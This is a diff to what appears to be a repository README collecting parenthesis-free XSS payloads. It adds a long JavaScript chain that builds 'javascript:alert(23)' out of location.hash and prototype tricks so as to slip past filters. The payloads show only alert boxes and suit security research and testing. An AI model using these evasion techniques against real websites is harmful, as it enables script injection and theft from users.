@@ -2,7 +2,7 @@
 
 
 ### This repo contains XSS payloads that doesn't require parentheses, collected from tweets, blogs...
-### All the POC's are alert box with number 23
+### All the POCs are alert box with number 23
 
 ---
     alert`23`
@@ -380,7 +380,54 @@ Only IE [matt](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-pare
     document.body.innerHTML=document.body.innerText;
 
 ---
+[physuru](https://physuru.dev)
 
+    amp=new Object
+    amp.valueOf=String.prototype.bold
+    document.body.innerHTML=amp+0
+    amp=document.body.firstElementChild
+    amp.innerText=document.body.innerHTML
+    amp.className=amp.innerHTML
+    amp.classList.valueOf=String.prototype.charAt
+    amp=amp.classList
+    location.hash=97
+    document.body.innerHTML=amp+location.hash
+    a=document.body.innerHTML
+    location.hash=99
+    document.body.innerHTML=amp+location.hash
+    c=document.body.innerHTML
+    location.hash=105
+    document.body.innerHTML=amp+location.hash
+    i=document.body.innerHTML
+    location.hash=106
+    document.body.innerHTML=amp+location.hash
+    j=document.body.innerHTML
+    location.hash=112
+    document.body.innerHTML=amp+location.hash
+    p=document.body.innerHTML
+    location.hash=114
+    document.body.innerHTML=amp+location.hash
+    r=document.body.innerHTML
+    location.hash=115
+    document.body.innerHTML=amp+location.hash
+    s=document.body.innerHTML
+    location.hash=116
+    document.body.innerHTML=amp+location.hash
+    t=document.body.innerHTML
+    location.hash=118
+    document.body.innerHTML=amp+location.hash
+    v=document.body.innerHTML
+    location.hash=58
+    document.body.innerHTML=amp+location.hash
+    colon=document.body.innerHTML
+    location.hash=40
+    document.body.innerHTML=amp+location.hash
+    lpar=document.body.innerHTML
+    location.hash=41
+    document.body.innerHTML=amp+location.hash
+    rpar=document.body.innerHTML
+    location=j+a+v+a+s+c+r+i+p+t+colon+alert.name+lpar+23+rpar
+---
 
 ___
 ### Anything: @[RenwaX23](https://twitter.com/RenwaX23)
